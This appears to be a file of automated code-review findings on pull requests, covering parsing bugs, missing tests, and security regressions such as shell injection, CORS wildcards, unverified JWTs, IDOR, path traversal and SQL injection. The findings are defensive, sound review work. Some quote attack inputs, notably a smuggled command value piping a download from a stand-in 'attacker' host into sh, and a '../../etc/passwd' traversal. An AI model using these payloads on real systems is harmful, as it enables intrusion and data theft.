findings.body:
`content_type.split(";")` leaves the optional whitespace that follows the separator on each parameter, so for the canonical header `multipart/form-data; boundary=----WebKitFormBoundaryXyz` the second element is `" boundary=----WebKitFormBoundaryXyz"` and `k` is `" boundary"`. The comparison `k == "boundary"` is therefore false for essentially every real request, the loop finishes without `break`, and the `for ... else` branch logs "Invalid multipart/form-data" — the body is never parsed and `self._request.arguments`/files stay empty. The previous code used a substring test (`'boundary=' in content_type`) which was immune to the leading space, so this is a regression introduced by the change.

Fix by normalising each field, e.g. `k, sep, v = field.strip().partition("=")` (and consider `k.lower()` since parameter names are case-insensitive per RFC 2045).

_Also raised by the security agent:_ Parameter name not stripped: boundary never matches for normal headers

findings.title: No test covers boundary parsing when 'boundary' isn't the last field
findings.body: The change fixes a real bug (boundary not always last param in Content-Type), but no test file is present in this diff to exercise a Content-Type header like 'multipart/form-data; charset=utf-8; boundary=xyz' where boundary is not last. Without such a test, a regression that reintroduces the 'last field' assumption would not be caught.

findings.title: get_host ignores '?' and '#' delimiters, allowing host confusion
findings.body:
`get_host` truncates the authority only at `/` (line 92) before splitting off userinfo at `@` (line 94). RFC 3986 ends the authority at `/`, `?` *or* `#`. For `http://trusted.example?@attacker.example/`, there is no `/` before the query, so `url` stays `trusted.example?@attacker.example`, the `@` split discards `trusted.example?` as userinfo, and the function returns host `attacker.example`. `urlparse`/browsers would return `trusted.example`. Conversely `http://trusted.example?x=1` returns the bogus host `trusted.example?x=1`.

Any caller that validates or allowlists a URL with a stdlib parser and then connects using `get_host` — or that follows a server-supplied redirect Location — will connect somewhere other than the validated host. Fix by cutting the authority at the first of `/`, `?` or `#` (e.g. `url = re.split('[/?#]', url, 1)[0]`) before the `@` and `:` splits, or delegate to `urlsplit`.

I cannot see the callers in this diff, so I cannot name the concrete entry point; in urllib3 the usual ones are user-supplied request URLs and redirect `Location` headers.

findings.title: is_connection_dropped raises when conn.sock is None
findings.body: Both branches pass `conn.sock` straight to `select()`/`poll.register()`. An `HTTPConnection` that has been created but never connected has `sock is None`, and `select([None], [], [], 0.0)` / `p.register(None, POLLIN)` raise `TypeError: argument must be an int, or have a fileno() method`. If any caller checks a freshly created (or closed) connection before it has been used, this helper crashes instead of reporting "not dropped". Guard with `if conn.sock is None: return False` at the top.

findings.title: No test coverage for extracted get_host/make_headers/is_connection_dropped
findings.body: This PR lifts three functions with real branching logic (make_headers, get_host, is_connection_dropped) into a new module, but the diff contains no test file. If get_host's parsing logic were subtly wrong (e.g. the port validation, or ordering of '@'/'/' splitting) or make_headers produced an incorrect header combination, nothing in this change would fail. Since this is presented as a pure refactor, at minimum tests exercising the moved behaviour should move/exist alongside it so future edits to these functions are caught.

findings.title: LocationParseError message never interpolates the url
findings.body: `raise LocationParseError("Failed to parse: %s")` contains a `%s` placeholder but no argument, so every parse failure surfaces the literal string `Failed to parse: %s` with no indication of which URL failed. Change it to `raise LocationParseError("Failed to parse: %s" % url)` (or include the original url, since `url` has already been stripped of scheme/path/auth by this point).

findings.title: order_total has no test verifying the refactor didn't break it
findings.body: discount_for is now unit tested, but order_total (which composes subtotal and discount_for) has no test. If the wiring between the two were wrong — e.g. wrong argument order, or subtotal computed differently than expected — nothing here would catch it.

findings.title: No test verifies describe() output after removing casts
findings.body: The diff removes type casts in describe() relying on type narrowing instead. There is no test file in this PR, and no repository context was retrieved to confirm existing coverage of describe() for both 'click' and 'key' event kinds. If narrowing were subtly wrong (e.g. Event union shape mismatched), nothing here would catch it.

findings.title: `HTTPMove.location` now returns a URL object, not the original string
findings.body:
Previously `self.location` was assigned the raw `location` argument; now it is assigned `URL(location)`. The documented contract (docs/web_reference.rst) states `location` is "the location the response redirects to, **as the string it was constructed with**" and that application code compares it against configured strings and calls `str.startswith` on it. A `yarl.URL` has no `startswith`, so such callers will raise `AttributeError`, and equality comparisons against plain strings will silently become `False`. `URL(...)` may also normalise/encode the value, so even `str(self.location)` is not guaranteed to round-trip the input.

If the goal is just to avoid parsing twice, keep the public attribute as the original value and use a local variable for the header, e.g. `url = URL(location); self.headers['Location'] = str(url); self.location = location`. If changing the attribute type is intentional, it needs a documentation update and a deprecation path.

_Also raised by the security agent:_ location becomes URL, silently breaking string-based redirect checks

findings.title: Documentation contradicts new location storage format
findings.body: The documentation in `docs/web_reference.rst` states that `HTTPMove.location` is 'as the string it was constructed with' and that 'Application code compares it against configured strings and passes it to `str.startswith`'. This change stores `location` as a `URL` object instead of the original string, breaking the documented contract. Code expecting a string (for `.startswith()` or comparison) will receive a `URL` object instead.

findings.title: No test guards self.location's type/value contract
findings.body: self.location is now assigned URL(location) instead of the original string, changing its type and potentially its string form (e.g. via URL normalization/encoding). Documentation states location should be 'the string it was constructed with', and application code may call str.startswith on it. There is no test in this change (or apparent in the surrounding diff) asserting that self.location equals the originally passed string or that it behaves as expected for consumers relying on string semantics. If this assignment is wrong, no test would fail.

findings.title: readany can return empty bytes before EOF after loop removal
findings.body:
`_wait()` is documented to resolve not only on `feed_data()`/`feed_eof()` but also at the end of a chunk, "which can happen with no new data in the buffer, so a caller must re-check its condition after waking rather than assuming data arrived." Replacing the `while` loop with `if` drops exactly that re-check: after a spurious wake, control falls through to `self._read_nowait(-1)` with an empty buffer and `self._eof` false, so `readany()` returns `b''` (or an empty chunk) while the stream is still open. Callers conventionally treat an empty return from `readany()` as end-of-stream, so this truncates reads. Restore the `while` loop so the buffer/EOF condition is re-evaluated after each wake.

_Also raised by the security agent:_ Single wait lets attacker-framed chunks yield a false EOF from readany

findings.title: No test guards the while→if change in readany's wait loop
findings.body: The docstring for _wait explicitly warns that the waiter can be resolved 'at the end of a chunk, which can happen with no new data in the buffer, so a caller must re-check its condition after waking rather than assuming data arrived.' The diff changes the loop from `while not self._buffer and not self._eof` to a single `if`, removing the re-check/retry behavior the docstring calls out as necessary. There is no test in this PR exercising a spurious wake (waiter resolved with buffer still empty and not at eof) to verify readany still behaves correctly, so a regression here (e.g., returning empty bytes prematurely instead of waiting again) would not be caught by any test.

findings.title: Implicit relative import breaks module load on Python 3
findings.body: `adapters` is a sibling module inside the `requests` package, not a top-level distribution. Implicit relative imports (`from adapters import ...`) were removed in Python 3 — absolute import semantics mean the interpreter will look for a top-level `adapters` module on `sys.path` and raise `ModuleNotFoundError: No module named 'adapters'`, aborting `import requests` entirely. Even on Python 2 this only works by accident and shadows any unrelated top-level `adapters` package a user happens to have installed. Restore `from .adapters import HTTPAdapter`.

findings.title: Implicit import lets any sys.path `adapters` module replace HTTPAdapter
findings.body:
`from .adapters import HTTPAdapter` unambiguously resolves to the package-local `requests/adapters.py`. `from adapters import HTTPAdapter` resolves against `sys.path`, which in CPython includes the script's directory (and historically the CWD for `-c`/`-m`/interactive use) ahead of site-packages. Any `adapters.py` an attacker or an unrelated dependency can place in one of those directories is imported instead, and its code runs at import time of `requests.sessions`.

The hijacked object is not incidental: `HTTPAdapter` is what builds the urllib3 pool manager and carries `cert_verify`/TLS behaviour, so a substituted adapter can silently disable certificate verification or exfiltrate every request body and credential the process sends. Restore the explicit relative form (`from .adapters import HTTPAdapter`) or use the fully qualified `from requests.adapters import HTTPAdapter`; both pin resolution to the intended module.

Note also that implicit relative imports were removed in Python 3, so on Py3 this line either raises `ModuleNotFoundError` or silently binds a foreign top-level module — never the package-local one.

findings.title: Removing None guard breaks get_cookie on unparseable Cookie header
findings.body: `HTTPRequest.cookies` is documented (and implemented) to return `None` when the `Cookie` header is present but cannot be parsed — the property body short-circuits with `if self._cookies is None: return None`. With the guard removed, `name in self.request.cookies` evaluates `in` against `None` and raises `TypeError: argument of type 'NoneType' is not iterable`, and line 4 would fail the same way. Any request with a malformed Cookie header turns a routine `get_cookie(...)` call into a 500 instead of returning `default`. Restore the guard (`if self.request.cookies is not None and name in self.request.cookies:`), or, if the premise of the PR is intended, change the `cookies` property to return an empty dict instead of `None` in the same change so the two stay consistent.

findings.title: Malformed Cookie header now raises TypeError in get_cookie
findings.body:
`self.request.cookies` is not always a mapping. The retrieved `HTTPRequest.cookies` property explicitly returns `None` when the `Cookie` header is present but cannot be parsed, and its docstring states "every consumer has to allow for that". Removing the `is not None` check means `name in self.request.cookies` evaluates `name in None`, which raises `TypeError: argument of type 'NoneType' is not iterable`.

Entry point: the `Cookie` request header, fully attacker-controlled and unauthenticated. Sink: the membership test on line 3 (and the subscript on line 4). Any remote client can send a deliberately unparseable Cookie header and force a 500 on every handler that calls `get_cookie` — including `get_secure_cookie` and the XSRF token path — turning a normally-tolerated bad header into a cheap request-level denial of service and an error-log flood.

The failure is fail-closed (no auth bypass), but it is trivially triggerable by anyone. Restore the guard, or make `cookies` return an empty mapping instead of `None` and update the property docstring accordingly.

findings.title: No test covers get_cookie when request.cookies is None
findings.body: The `cookies` property documented in httpserver.py explicitly returns None when the Cookie header is malformed. The diff removes the `is not None` guard in get_cookie, relying on the assumption that cookies is always a mapping. If that assumption is wrong (e.g. a malformed Cookie header), `name in self.request.cookies` will raise TypeError instead of returning default. No test in this PR (or apparently in the existing suite, since none is included) exercises get_cookie with a malformed/None cookies value, so this regression would not be caught.

findings.title: Dropping strip() breaks boundary detection for standard Content-Type headers
findings.body:
`content_type.split(";")` on the near-universal header `multipart/form-data; boundary=----WebKitFormBoundaryXyz` yields `["multipart/form-data", " boundary=----WebKitFormBoundaryXyz"]`. Without the `.strip()`, `field.partition("=")` gives `k == " boundary"` (leading space), so the `k == "boundary"` test on line 5 never matches, `_parse_mime_body` is never called, and the request body is silently discarded \u2014 no exception, no error, just empty `arguments`/`files`. The strip was not redundant: it is what normalises the optional whitespace RFC 9110 permits around `;`-separated parameters. It also trimmed trailing whitespace/CR from the value before it reached `_parse_mime_body`. Restore it, e.g. `k, sep, v = field.strip().partition("=")`, or strip `k` and `v` individually.

_Also raised by the security agent:_ Dropping strip() on Content-Type params breaks/desyncs boundary selection

findings.title: Removed strip() on multipart field with no visible test for whitespace handling
findings.body: The change drops `.strip()` before partitioning the field into key/value, so a Content-Type header like `multipart/form-data; boundary=abc` (with a space after the semicolon, which is the common formatting) would now produce k == ' boundary' instead of 'boundary', silently failing to match and breaking multipart parsing. No test file is included in this diff, so there is no evidence this regression would be caught.

findings.title: Format string placeholder without argument
findings.body:
The error message contains a `%s` placeholder but no argument is passed to the `%` operator. When this exception is raised, Python will fail with a TypeError about not enough arguments for format string. The fix should either remove the placeholder from the message or restore the `url` argument.

_Also raised by the correctness agent:_ Format placeholder left unsubstituted in LocationParseError message

findings.title: No test covers the LocationParseError message content
findings.body: The change removes the '% url' interpolation argument from the raise statement, leaving the literal string 'Failed to parse: %s' instead of the interpolated value. There is no test in this diff (or apparently in the surrounding suite) that asserts on the exception message text, so this change — whether intentional or a bug — would not be caught by any test.

findings.title: Shell injection in create_archive via f-string with shell=True
findings.body:
`cmd` is assembled by f-string interpolation of the `name` and `directory` parameters and then executed with `shell=True`, so any shell metacharacter in either argument is interpreted by `/bin/sh`. A value such as `directory = "/tmp; curl attacker/x | sh"` or `name = "a$(id)"` yields arbitrary command execution as the service user.

Fix by dropping the shell entirely and passing an argument list, as the existing `list_exports` on line 5 already does:

```python
archive = os.path.join("/exports", f"{name}.tar.gz")
subprocess.run(["tar", "-czf", archive, directory], check=True)
```

If a shell is genuinely required, interpolate only through `shlex.quote()`.

_Also raised by the correctness agent:_ Unquoted shell interpolation breaks on spaces/metacharacters in name or directory

findings.title: No test coverage for create_archive
findings.body: create_archive builds a shell command via string interpolation of `name` and `directory` and executes it with shell=True. There is no test in this diff exercising this function, so neither its correctness (does it produce the archive with the expected name/contents) nor a fix to remove the shell injection risk would be verified by any existing test.

findings.title: Public function `create_archive` lacks a docstring
findings.body: The `create_archive` function is exported and accepts parameters that will be interpolated into a shell command. Without documentation, callers cannot easily understand the function's contract, expected parameter formats, return value semantics, or any constraints on input. A brief docstring clarifying the purpose and parameter expectations would help users of this function.

findings.title: dashboardCors allows any origin with credentials enabled
findings.body:
`dashboardCors` sets `origin: "*"` together with `credentials: true`, discarding the `ALLOWED` allowlist used by the existing middleware a few lines above. Two problems:

1. **Allowlist removed.** Any site on the internet can issue cross-origin requests to whatever routes mount `dashboardCors` and read the responses. If those routes are authenticated by anything other than cookies (bearer token forwarded by a proxy, IP allowlist, network position, or simply unauthenticated-but-internal data), the response body is now readable by `https://evil.example`.
2. **The config is self-contradictory and invites a worse fix.** The `cors` package emits the literal header `Access-Control-Allow-Origin: *` for `origin: "*"`, and browsers refuse to attach cookies to a wildcard ACAO. So the stated goal — "the new dashboard origin can call the API with cookies" — will not actually work, and the natural next step is to switch to `origin: true` (reflect the request Origin) or a regex, which *does* ship credentials to arbitrary origins and gives full session-riding read access.

Fix: name the dashboard origin explicitly, e.g. add it to `ALLOWED` and reuse the existing middleware, rather than introducing a wildcard variant. Never combine a reflected/wildcard origin with `credentials: true`.

findings.title: origin "*" with credentials:true is rejected by browsers
findings.body:
`dashboardCors` sets `origin: "*"` together with `credentials: true`. The cors middleware will emit the literal header `Access-Control-Allow-Origin: *`, and the Fetch/XHR spec requires the user agent to fail any request made with `credentials: 'include'` when the allow-origin header is the wildcard rather than an echo of the request `Origin`. The stated goal — "the new dashboard origin can call the API with cookies" — therefore cannot be met by this configuration; the preflight will pass the server but the browser will block the response and cookies will never be sent.

Replace the wildcard with the concrete dashboard origin (or a reflect-from-allowlist function, as the existing `ALLOWED` export on line 6 already does) so the response echoes a single origin and `Vary: Origin` is set. Aside from being the only thing that works, it avoids exposing credentialed endpoints to every origin.

findings.title: New CORS config with wildcard+credentials has no test coverage
findings.body: The new `dashboardCors` export combines `origin: "*"` with `credentials: true`, which is an invalid/unsafe CORS configuration in most implementations (browsers reject wildcard origin with credentials, or the underlying `cors` middleware silently reflects the request origin instead). No test verifies the actual behavior of this exported middleware — e.g., what `Access-Control-Allow-Origin` header is actually emitted for a given request. If this configuration behaves unexpectedly (silently reflecting all origins, or failing outright), nothing in the current change would catch it.

findings.title: Live AcmePay secret key hardcoded in source
findings.body:
`ACMEPAY_SECRET_KEY` is a literal `acme_live_...` value committed to the repository and assigned directly to `acmepay.api_key`. The `acme_live_` prefix indicates a production credential, not a test key, and the change removes the previous `os.environ["ACMEPAY_SECRET_KEY"]` lookup (the `import os` line is deleted), so the only source of the key is now the checked-in constant.

Anyone with read access to the repo — including CI logs, forks, mirrors, and anyone who gains access to a developer machine or a build artifact — can use this key to move money through the payments account. Git history keeps it even if a follow-up commit deletes the line.

Actions: (1) treat this key as compromised and rotate it in the AcmePay dashboard immediately; (2) restore the environment-variable lookup (or a secrets-manager fetch) rather than a module constant; (3) scrub the value from git history, since reverting the commit does not remove it from earlier objects.

findings.title: Env-based key replaced by a constant, silently ignoring per-env config
findings.body: `client()` previously resolved the key from `os.environ["ACMEPAY_SECRET_KEY"]`, so each deployment (local, CI, staging, prod) supplied its own credential and a missing one failed loudly with a `KeyError`. After this change the key is a module-level constant baked in at import time, and the `os` import is gone. Any environment that still sets `ACMEPAY_SECRET_KEY` is now silently ignored: staging and test runs will authenticate with the `acme_live_...` credential and issue real charges, with no error to signal the misconfiguration. Restore the environment lookup (optionally with an explicit error message if unset) and remove the literal — a literal that begins with `acme_live_` also means a production credential is now in version control and must be rotated.

findings.title: fake_client() return shape does not match client()
findings.body: `client()` returns the `acmepay` module (attribute access, e.g. `acmepay.api_key`, `acmepay.Charge.create(...)`), but `fake_client()` returns a plain dict `{"api_key": TEST_KEY}`. Any test that substitutes `fake_client` for `client` will get an object that only supports subscripting, so it can neither assert on `.api_key` nor exercise any call the real client makes — the fixture will pass while testing nothing meaningful, or fail with `TypeError`/`AttributeError`. Return a stub object exposing the same attribute surface as the module instead.

findings.title: tenant_of trusts an unverified token, unlike claims_for beside it
findings.body:
`tenant_of` calls `jwt.decode(..., options={"verify_signature": False})`, so the signature, `exp`, `iss` and `aud` are all unchecked. Anything the caller does with the returned `tenant_id` \u2014 scoping a query, picking a database, authorising a write \u2014 is driven by a value the presenter of the token chose freely, with no key material involved. A client can mint `{"tenant_id": "<someone else's>"}` with `alg=none` and be served that tenant's data.

The module directly above already has the correct primitive. Implement this as `return claims_for(token)["tenant_id"]` (optionally caching the verified claims per request if the round-trip to `public_key()` is the motivation stated in the PR description). If an unverified read is genuinely needed for a pre-auth routing decision, name it so callers cannot mistake it \u2014 e.g. `unverified_tenant_hint` \u2014 and never let its result reach an authorisation decision.

_Also raised by the security agent:_ tenant_of() reads tenant_id from an unverified JWT

findings.title: No test exercises tenant_of() behavior
findings.body: tenant_of() is new code that extracts a claim from an unverified token, but no test in this diff verifies it returns the correct tenant_id, handles a missing 'tenant_id' key, or handles malformed tokens. If the key lookup, KeyError path, or decode options were broken, nothing would fail.

findings.title: Unguarded subscript raises KeyError when tenant_id is absent
findings.body: Because verification is off, any well-formed JWT reaches line 12, including tokens that carry no `tenant_id` claim at all. The bare subscript raises `KeyError` rather than an auth-domain error, which callers wrapping this in an `except InvalidTokenError` (the natural partner for `claims_for`) will not catch, surfacing as a 500 instead of a 401. Use `.get("tenant_id")` with an explicit check, or raise the module's own auth error.

findings.title: update_payment_method mutates any object without ownership check
findings.body:
`update_payment_method` resolves `pm` directly from the caller-supplied `pm_id` and writes `body["billing_name"]` to it, then persists with `pm.save()`. No `require_owner` call guards the mutation, even though `current_user(request)` is assigned to `user` on line 11 and then never used — strongly suggesting the check was intended and dropped. Any authenticated user can enumerate or guess `pm_id` values and rewrite the billing name on another account's saved card (a classic IDOR; billing-name control is also a step toward payment/fraud abuse). Add `require_owner(user, pm)` immediately after the `PaymentMethod.get(pm_id)` on line 12, matching the read path on line 6.

_Also raised by the correctness agent:_ update_payment_method mutates object without require_owner check

_Also raised by the correctness agent:_ Unguarded body["billing_name"] raises KeyError on a malformed request

findings.title: Public function missing required ownership check
findings.body: The `update_payment_method` function retrieves and modifies a PaymentMethod by ID without verifying the current user owns it. The repository convention (documented in `api/auth.py`) states "Every object mutation must call this" with respect to `require_owner()`. The parallel `get_payment_method` function on lines 5-7 demonstrates the correct pattern. A caller could use this function to modify any payment method in the system, regardless of ownership.

findings.title: No test for update_payment_method, including missing authz check
findings.body: update_payment_method is new and has no accompanying test. Nothing would catch that it never calls require_owner(user, pm) before mutating and saving the record — unlike the adjacent get handler which does call it (line 6). A test exercising this endpoint with a user who does not own the payment method would fail against an ideal implementation but there is currently no test at all to catch this or any other regression in this function.

findings.title: Rate limit removed from unauthenticated password reset endpoint
findings.body:
`request_reset(request, email)` takes a caller-supplied `email` and passes it straight to `send_reset_email(email)` with no throttle after the `@rate_limit("5/hour")` decorator and its import were deleted. An unauthenticated attacker can now call this endpoint in a loop to (a) mail-bomb any address they choose, (b) enumerate accounts if the response or timing differs for known vs. unknown addresses, and (c) burn the sending quota / damage sender reputation for the whole service. The PR rationale — "the email provider already throttles" — protects the provider's outbound volume, not the victim's inbox or a specific account, and typically applies per-sender rather than per-recipient or per-source-IP. If the limiter genuinely needs to move, keep an equivalent per-email and per-IP limit at the framework or gateway layer and reference it here; otherwise restore the decorator.

Note also that removing the decorator may shorten reset-token generation to an effectively unbounded oracle if tokens are predictable — that cannot be assessed from this diff.

findings.title: No test coverage for removal of rate limiting on password reset
findings.body: The diff removes the `@rate_limit("5/hour")` decorator from `request_reset`, meaning the endpoint can now be called an unlimited number of times. There is no test file in this diff verifying either the old throttling behavior or the new unthrottled behavior. If this change is wrong (e.g., the email provider's throttling is insufficient or absent for this call path), nothing in the test suite would catch the regression — a burst of calls to `request_reset` would succeed silently.

findings.title: Handler reports success even when the provider throttles or rejects the send
findings.body: The justification for dropping `@rate_limit("5/hour")` is that the email provider throttles instead. But this handler cannot observe that throttling: `send_reset_email(email)` is called on line 2 and line 3 returns `{"sent": True}` unconditionally, with no try/except and no inspection of a return value. If the provider now becomes the enforcement point, its rejections (throttle responses, bounces, transport errors) are either swallowed by `send_reset_email` or propagate as an unhandled exception — neither yields a truthful `sent` flag to the caller. If the limiter is really being delegated downstream, the handler needs to branch on the send result (or catch the provider's throttle error) so the response body reflects what actually happened.

findings.title: Preview path skips _confined(), allowing reads outside EXPORT_ROOT
findings.body:
`read_export` (line 14) resolves the caller-supplied `name` through `_confined()` before opening it; `read_export_preview` instead does a bare `os.path.join(EXPORT_ROOT, name)`. `os.path.join` does not constrain the result: a `name` of `../../etc/passwd` walks out of the export directory, and an absolute `name` such as `/etc/passwd` causes `join` to discard `EXPORT_ROOT` entirely. Since the PR description says the preview path "reuses the same layout as download", the omission looks unintentional. Route the path through the same helper: `path = _confined(name)` and then `fh.read(limit)`.

_Also raised by the security agent:_ Preview path skips _confined(), allowing path traversal

findings.title: Public function lacks security contract documentation
findings.body: The function `read_export_preview` is a public API (called from line 19, defined at module level) that takes a user-supplied `name` parameter and constructs a file path without the `_confined()` security check that `read_export` applies on line 14. This is a significant departure from the existing pattern in this module. The absence of a docstring means callers cannot understand what path constraints (if any) exist, and whether they must validate `name` themselves. A caller could reasonably assume it follows the same security model as `read_export` and be wrong.

findings.title: New preview function has no test and skips path confinement
findings.body: read_export_preview builds its path with os.path.join(EXPORT_ROOT, name) directly, unlike the existing download function which calls _confined(name) first. There is no test in this diff covering this new function, so nothing would catch either a traversal regression (e.g. name='../../etc/passwd') or a future refactor that further diverges behavior from the download path.

findings.title: Ownership check removed from bulk_export enables cross-tenant read
findings.body:
`bulk_export` takes caller-supplied `report_ids`, fetches each `Report` by id, and serialises them with no authorisation check. The deleted loop was the only thing binding the returned objects to `user.tenant_id`; `current_user(request)` establishes authentication only, and the resulting `user` is now unused for any access decision. Any authenticated caller can enumerate or guess report ids and read another tenant's reports in bulk.

Restore the check inside the loop, or push it into the fetch (e.g. `Report.get(rid, tenant_id=user.tenant_id)` / a tenant-scoped query) so the filtering happens in the database rather than per object. If the motivation was the N calls to `require_owner`, batch-load the reports and compare tenant ids in one pass \u2014 that is cheap and preserves the control. Do not merge this as written.

_Also raised by the correctness agent:_ bulk_export no longer enforces per-report ownership

findings.title: No test would catch removal of per-object ownership check
findings.body: The diff removes the require_owner(user, report) call from bulk_export, meaning a user could now fetch reports belonging to another tenant simply by passing arbitrary report_ids. No test file is included in this PR, and nothing in the retrieved repository context suggests an existing test exercises cross-tenant access to bulk_export. If this change is wrong (i.e., the removal is a genuine authz regression rather than an intentional, already-enforced-elsewhere check), no test currently in the suite would fail — the function would continue to return report dicts for out-of-tenant report_ids silently. A test asserting that bulk_export raises Forbidden (or filters) when report_ids include reports from a different tenant is needed to make this regression detectable.

findings.title: SQL injection via f-string interpolation in search_customers
search_customers bypasses execute()'s parameter contract and breaks on quotes
findings.body:
`billing.db.execute` documents that "`params` must carry every caller value", and the sibling `get_customer` on line 5 follows it (`execute("... WHERE id = %s", (customer_id,))`). `search_customers` instead interpolates `term` and `status` directly into the SQL literal and calls `execute(sql)` with `params` omitted.

Beyond the obvious injection exposure, this is a plain correctness defect for legitimate input: a support agent searching for `O'Brien` produces `... name LIKE '%O'Brien%' ...`, which is a syntax error and raises from the driver. A `None` term or status silently becomes the literal string `None` rather than matching nothing or everything deliberately.

Fix by following the existing pattern:

    sql = "SELECT * FROM customers WHERE name LIKE %s AND status = %s"
    return execute(sql, (f"%{term}%", status))

Note that this also removes the second hazard in the current line 9: the literal `%` wildcards are embedded in the SQL text, so if anyone later adds a params tuple to this same string the pyformat driver will choke on the stray `%` sequences.

findings.title: search_customers violates execute() contract
findings.body: The `execute()` function's docstring (in db.py) states: "`params` must carry every caller value." The `search_customers()` function instead constructs SQL with f-string interpolation on lines 9, passing the raw `sql` string to `execute()` with no params argument. This contradicts the established contract and misleads callers about the safe pattern they should follow.

findings.title: No test coverage for search_customers
